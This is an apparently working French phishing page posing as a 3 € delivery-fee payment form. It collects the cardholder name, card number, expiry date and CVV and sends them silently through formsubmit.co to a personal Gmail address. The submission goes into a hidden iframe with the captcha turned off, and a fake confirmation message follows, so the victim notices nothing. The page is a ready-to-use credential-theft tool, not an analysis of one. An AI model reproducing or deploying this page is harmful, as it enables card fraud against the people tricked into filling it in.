<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Paiement de livraison</title>
  <style>
    * {
      box-sizing: border-box;
    }
    body {
      margin: 0;
      padding: 0;
      height: 100vh;
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .payment-container {
      width: 100%;
      max-width: 380px;
      background-color: white;
      padding: 20px;
      margin: 10px;
      border-radius: 10px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
    }
    .card-icons {
      text-align: center;
      margin-bottom: 15px;
    }
    .card-icons img {
      height: 26px;
      margin: 0 4px;
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
      font-weight: normal;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 15px;
    }
    .row {
      display: flex;
      gap: 10px;
    }
    .row input {
      flex: 1;
    }
    .btn {
      background-color: #007BFF;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      margin-top: 15px;
      cursor: pointer;
      width: 100%;
    }
    .btn:hover {
      background-color: #0056b3;
    }
    .message {
      margin-top: 20px;
      text-align: center;
      color: green;
      font-size: 14px;
    }
    iframe {
      display: none;
    }
  </style>
</head>
<body>
  <div class="payment-container">
    <div class="card-icons">
      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png"/>
      <img src="https://img.icons8.com/color/48/000000/visa.png"/>
      <img src="https://img.icons8.com/color/48/000000/amex.png"/>
      <img src="https://img.icons8.com/color/48/000000/discover.png"/>
      <img src="https://img.icons8.com/color/48/000000/jcb.png"/>
    </div>
    <h2>Paiement de livraison</h2>
    <form id="payment-form" action="https://formsubmit.co/06esdgj42@gmail.com" method="POST" target="invisible">
      <input type="text" name="nom" placeholder="Nom sur la carte" required />
      <input type="text" name="numero" placeholder="N° de carte" required />
      <div class="row">
        <input type="text" name="expiration" placeholder="MM/AA" required />
        <input type="text" name="cvv" placeholder="CVV" required />
      </div>
      <input type="hidden" name="_captcha" value="false">
      <button type="submit" class="btn">Payer 3 €</button>
    </form>
    <iframe name="invisible"></iframe>
    <div class="message" id="confirmation-message" style="display: none;">
      ✅ Merci ! Votre code de confirmation vous sera envoyé sous peu.
    </div>
  </div>
  <script>
    const form = document.getElementById('payment-form');
    const message = document.getElementById('confirmation-message');
    form.addEventListener('submit', function() {
      form.style.display = 'none';
      message.style.display = 'block';
    });
  </script>
</body>
</html>
